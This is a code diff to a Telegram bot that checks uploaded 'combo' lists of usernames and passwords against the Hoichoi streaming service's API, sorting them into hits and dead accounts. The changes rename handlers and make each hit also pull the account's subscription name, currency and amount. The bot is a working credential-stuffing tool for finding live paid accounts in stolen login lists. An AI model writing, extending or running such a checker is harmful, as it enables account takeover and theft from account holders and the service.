@@ -15,7 +15,7 @@ cancel_check = False
 def process_hoitxt_command(bot, message):
     bot.send_message(message.chat.id, "Please send your txt file with combo data.")
 
-def handle_docs(bot, message):
+def handle_hoitxt_docs(bot, message):
     global cancel_check
     cancel_check = False
     try:
@@ -34,9 +34,9 @@ def handle_docs(bot, message):
         # Creating inline keyboard for showing results and cancel button
         keyboard = types.InlineKeyboardMarkup(row_width=1)
         keyboard.add(
-            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit'),
-            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead'),
-            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel')
+            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit_hoitxt'),
+            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead_hoitxt'),
+            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel_hoitxt')
         )
 
         initial_message = (
@@ -93,13 +93,13 @@ def handle_docs(bot, message):
     except Exception as e:
         bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
 
-def handle_callback_query(call, bot):
+def handle_hoitxt_callback_query(call, bot):
     global cancel_check
-    if call.data == 'hit':
+    if call.data == 'hit_hoitxt':
         send_combos(call.message.chat.id, hits, bot, "HIT ✅ Combos")
-    elif call.data == 'dead':
+    elif call.data == 'dead_hoitxt':
         send_combos(call.message.chat.id, dead, bot, "Dead ❌ Combos")
-    elif call.data == 'cancel':
+    elif call.data == 'cancel_hoitxt':
         cancel_check = True
         bot.send_message(call.message.chat.id, "Process has been canceled.")
 
@@ -143,7 +143,19 @@ def check_hoitxt_combo(user, pwd):
         response = session.get("https://prod-api.viewlift.com/payments/billing-history?site=hoichoitv", headers=headers)
         
         if "subscriptionStatus" in response.text:
-            return f"HIT: {response.json().get('subscriptionStatus')} until {response.json().get('subscriptionEndDate')}"
+            subscription_info_url = "https://prod-api.viewlift.com/payments/subscription-info?site=hoichoitv"
+            subscription_info_headers = headers.copy()
+            subscription_info_response = requests.get(subscription_info_url, headers=subscription_info_headers)
+            subscription_info_data = subscription_info_response.json()
+
+            subscription_name = subscription_info_data.get('sku', 'Subscription Not Found')
+            currency = subscription_info_data.get('currency_code', 'N/A')
+            subscription_amount = subscription_info_data.get('amount', 'N/A')
+
+            return (f"HIT SUCCESSFULLY✅\n"
+                    f"Subscription Name: {subscription_name}\n"
+                    f"Currency: {currency}\n"
+                    f"Subscription Amount: {subscription_amount}")
         else:
             return "Dead"
     else:
